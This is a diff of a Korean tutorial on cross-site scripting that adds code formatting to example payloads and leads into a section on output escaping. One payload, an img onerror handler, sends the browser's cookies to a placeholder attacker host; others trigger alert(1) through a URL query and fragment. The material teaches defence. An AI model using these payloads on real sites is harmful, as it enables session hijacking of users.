@@ -45,7 +45,7 @@ Stored XSS는 악성 스크립트를 서버의 데이터베이스에 저장(Stor
 </script>
 ```
 
-글 생성 페이지에서 제목 인풋에 <img src="x" onerror="location.href='http:\/\/hackerserver.com/steal?data='+document.cookie;"> 이런 값을 넣어 글을 생성하면 글을 조회할때 img태그에서 이미지 주소인 x를 불러오려고 시도하지만 주소가 잘못되었으므로 에러가 발생하고 에러 발생 시 실행되는 onerror속성이 실행된다. 해당 코드의 경우 해커의 서버에 브라우저의 쿠키값을 URL파라미터로 보내는 코드이고 공격자 서버의 로그에 사용자의 쿠키 정보가 기록이 되게된다.
+글 생성 페이지에서 제목 인풋에 `<img src="x" onerror="location.href='http:\/\/hackerserver.com/steal?data='+document.cookie;">` 이런 값을 넣어 글을 생성하면 글을 조회할때 img태그에서 이미지 주소인 x를 불러오려고 시도하지만 주소가 잘못되었으므로 에러가 발생하고 에러 발생 시 실행되는 onerror속성이 실행된다. 해당 코드의 경우 해커의 서버에 브라우저의 쿠키값을 URL파라미터로 보내는 코드이고 공격자 서버의 로그에 사용자의 쿠키 정보가 기록이 되게된다.
 
 
 ## 반사형(Reflected) XSS
@@ -90,7 +90,7 @@ Stored XSS 및 Reflected XSS는 서버에서 악성 스크립트의 공격이 �
 </script>
 ```
 
-해당 코드는 URL의 파라미터에서 name값을 가져와 화면에 보여주는 코드이다. 만약 http://example.com/?name=<img src=x onerror=alert(1)>이라는 경로로 접속한다면 img태그가 그대로 페이지에 삽입되고 img태그에서 이미지 주소인 x를 불러오려고 시도하지만 주소가 잘못되었으므로 에러가 발생하고 에러 발생 시 실행되는 onerror속성이 실행된다.
+해당 코드는 URL의 파라미터에서 name값을 가져와 화면에 보여주는 코드이다. 만약 `http://example.com/?name=<img src=x onerror=alert(1)>`이라는 경로로 접속한다면 img태그가 그대로 페이지에 삽입되고 img태그에서 이미지 주소인 x를 불러오려고 시도하지만 주소가 잘못되었으므로 에러가 발생하고 에러 발생 시 실행되는 onerror속성이 실행된다.
 
 ```
 <h2 id="current-tab">선택된 탭: 기본 홈</h2>
@@ -106,7 +106,7 @@ Stored XSS 및 Reflected XSS는 서버에서 악성 스크립트의 공격이 �
   }
 </script>
 ```
-해당 코드는 URL 프래그먼트에 값을 가져와 화면에 보여주는 코드이다. 만약 http://example.com/#<img src=x onerror=alert(1)>이라는 경로로 접속한다면 방금과 같이 x를 불러오지 못하고 onerror를 실행하게 된다
+해당 코드는 URL 프래그먼트에 값을 가져와 화면에 보여주는 코드이다. 만약 `http://example.com/#<img src=x onerror=alert(1)>`이라는 경로로 접속한다면 방금과 같이 x를 불러오지 못하고 onerror를 실행하게 된다
 
 ## 보안 대책
 출력 값 이스케이핑 (Escaping)
